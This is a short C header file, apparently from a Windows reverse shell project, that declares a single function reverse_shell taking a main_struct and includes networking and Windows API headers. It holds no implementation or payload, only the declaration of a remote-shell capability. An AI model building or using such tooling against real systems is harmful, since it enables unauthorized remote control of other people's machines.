#ifndef _REVERCE_H_
#define _REVERCE_H_

/* main reverse shell header.
*/

#include "../main.h"
#include "win_api.h"
#include "network.h"
#include "bin.h"

int reverse_shell(struct main_struct *m_s);

#endif
